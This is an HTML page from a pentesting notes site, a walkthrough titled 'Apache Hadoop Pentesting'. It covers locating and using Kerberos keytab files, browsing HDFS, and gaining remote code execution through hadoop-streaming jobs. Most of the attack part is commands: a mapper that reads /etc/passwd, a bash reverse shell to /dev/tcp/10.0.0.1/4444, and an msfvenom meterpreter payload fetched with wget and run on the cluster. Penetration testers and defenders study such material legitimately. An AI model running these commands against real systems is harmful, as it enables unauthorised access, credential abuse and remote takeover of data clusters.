<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache Hadoop Pentesting - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache Hadoop Pentesting", url: "#_top", children: [
              {title: "Authenticate using Keytab", url: "#authenticate-using-keytab" },
              {title: "HDFS Commands", url: "#hdfs-commands" },
              {title: "RCE (Remote Code Execution)", url: "#rce-remote-code-execution" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="apache-hadoop-pentesting">Apache Hadoop Pentesting</h1>
<p>Apache Hadoop is a collection of open-source software utilities that facilitates using a network of many computers to solve problems involving massive amounts of data and computation. It uses ports 8020, 9000, 50010, 50020, 50070, 50075, 50475 by default. </p>
<h2 id="authenticate-using-keytab">Authenticate using Keytab</h2>
<p>Kyetab files are used to authenticate to the KDC (key distribution center) on Kerberos authentication. To find them, execute the following command in target system.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>find / -type f -name *.keytab 2&gt;/dev/null
</span></code></pre></div>
<p>After finding them, we can use them to gather information or authenticate.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a># Gather information from a keytab
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a># -k: Speicifed a keytab file
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>klist -k /path/to/example.keytab
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a># Authenticate to Kerberos server and request a ticket.
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a># &lt;principal_name&gt;: it&#39; stored in example.keytab. Run `klist -k example.keytab` to check it.
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a># -k: Use a keytab
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a># -V: verbose mode
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a># -t &lt;keytab_file&gt;: Filename of keytab to use
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>kinit &lt;principal_name&gt; -k -V -t /path/to/example.keytab
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a># e.g.
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>kinit user/hadoop.docker.com@EXAMPLE.COM -k -V -t /path/to/example.keytab
</span></code></pre></div>
<h3 id="impersonate-another-hadoop-service">Impersonate Another Hadoop Service</h3>
<p>We can authenticate other services by executing <strong><code>klist</code></strong> and <strong><code>kinit</code></strong>. Then we can investigate the HDFS service by the following HDFS commands.</p>
<h2 id="hdfs-commands">HDFS Commands</h2>
<h3 id="find-hdfs-binary-path">Find HDFS Binary Path</h3>
<p>When authenticated, we need to find the path of the <strong><code>hdfs</code></strong> command associated with Hadoop. This command allows us to execute file system command in the datalake.<br />
If the path exists in the default PATH (confirm to run <strong><code>echo $PATH</code></strong>), we don't have to find them. However, if the path is not set in the default PATH, find it by running the following command.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>find / -type f -name hdfs 2&gt;/dev/null
</span></code></pre></div>
<p>If we find the path, go to the directory and use commands as below.</p>
<h3 id="hdfs-command-cheat-sheet">HDFS Command Cheat Sheet</h3>
<p>Please refer to <a href="https://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-hdfs/HDFSCommands.html#Overview">https://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-hdfs/HDFSCommands.html#Overview</a></p>
<p>As mentioned above, if the <strong><code>hdfs</code></strong> path is not set in the PATH, we need to go to where the <strong><code>hdfs</code></strong> binary exists.<br />
Basically, their commands are similar to UNIX.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>hdfs dfs -help
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a># List files in the hdfs service root.
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>hdfs dfs -ls /
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a># -R: Recursive
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>hdfs dfs -ls /R /
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a># Get the contents of the file
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>hdfs dfs -cat /example.txt
</span></code></pre></div>
<h2 id="rce-remote-code-execution">RCE (Remote Code Execution)</h2>
<p>Reference: <a href="https://github.com/wavestone-cdt/hadoop-attack-library/tree/master/Tools%20Techniques%20and%20Procedures/Executing%20remote%20commands">https://github.com/wavestone-cdt/hadoop-attack-library/tree/master/Tools Techniques and Procedures/Executing remote commands</a></p>
<p>First we need to create arbitrary file that contains at lease one character. Then put it on HDFS.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>echo hello &gt; /tmp/hello.txt
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>hdfs dfs -put /tmp/hello.txt /tmp/hello.txt
</span></code></pre></div>
<p>Now execute below command to execute remote command.<br />
Note that the <strong><code>-output</code></strong> directory needs to be NOT exist, so if we want to multiple execute command, we have to delete the previous output folder or specify another name.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>hadoop jar /path/to/hadoop-streaming-x.x.x.jar -input /tmp/hello.txt -output /tmp/output -mapper &quot;cat /etc/passwd&quot; -reducer NONE
</span></code></pre></div>
<p>We can see the result of the command in the output directory. For example,</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>hdfs dfs -ls /tmp/output
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>hdfs dfs -cat /tmp/output/part-00000
</span></code></pre></div>
<h3 id="reverse-shell">Reverse Shell</h3>
<p>In target machine, create a reverse shell script and put it on HDFS.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>echo &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&#39; &gt; /tmp/shell.sh
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>hdfs dfs -put /tmp/shell.sh /tmp/shell.sh
</span></code></pre></div>
<p>In local machine, start a listener.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>nc -lvnp 4444
</span></code></pre></div>
<p>Now execute the following command.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a># -mapper: The HDFS path of the shell.elf
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a># -file: The system path of the shell.elf
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>hadoop jar /path/to/hadoop-streaming-x.x.x.jar -input /tmp/hello.txt -output /tmp/output -mapper &quot;/tmp/shell.sh&quot; -reducer NONE -file &quot;/tmp/shell.sh&quot;  -background
</span></code></pre></div>
<p>We can get a shell in local machine.</p>
<h3 id="reverse-shell-msfvenom">Reverse Shell (MsfVenom)</h3>
<p>First create a reverse shell payload using msfvenom in local machine and prepare a listener using msfconsole. </p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf &gt; shell.elf
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>msfconsole
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>msf&gt; use exploit/multi/handler
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>msf&gt; set payload linux/x86/meterpreter/reverse_tcp
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>msf&gt; set lhost 10.0.0.1
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>msf&gt; set lport 4444
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>msf&gt; run
</span></code></pre></div>
<p>Transfer the payload to target machine.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>wget http://10.0.0.1:8000/shell.elf -O /tmp/shell.elf
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a># Put it on HDFS.
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>hdfs dfs -put /tmp/shell.elf /tmp/shell.elf
</span></code></pre></div>
<p>Now execute the following command.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a># -mapper: The HDFS path of the shell.elf
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a># -file: The system path of the shell.elf
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>hadoop jar /path/to/hadoop-streaming-x.x.x.jar -input /tmp/hello.txt -output /tmp/output -mapper &quot;/tmp/shell.elf&quot; -reducer NONE -file &quot;/tmp/shell.elf&quot;  -background
</span></code></pre></div>
<p>We can get a shell in meterpreter so to spawn the OS shell, run <strong><code>shell</code></strong> command in the meterpreter.</p>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/network/pentesting/apache-hadoop-pentesting.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ‚ö†Ô∏è The quieter you become, the more you are able to hear ü•∑</p>
</footer>

</body>
</html>